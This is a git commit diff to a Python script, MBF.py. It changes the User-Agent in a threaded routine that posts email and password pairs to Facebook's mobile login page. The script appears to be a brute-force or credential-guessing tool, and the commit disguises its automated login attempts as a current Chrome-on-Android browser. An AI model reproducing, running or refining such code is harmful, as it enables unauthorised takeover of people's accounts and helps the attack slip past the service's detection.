2b675c9051634f0f77b619a8b6a7997a7cc29fb0
officialfeeder <62536001+officialfeeder@users.noreply.github.com>
2020-08-22 03:50:44 +0700

    Update MBF.py

--- MBF.py
+++ MBF.py
@@ -35,7 +35,7 @@ class mt(threading.Thread):
 		return self.a,self.id
 	def run(self):
 		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36'}))
 		except KeyboardInterrupt:
 			sys.exit()
 		except:
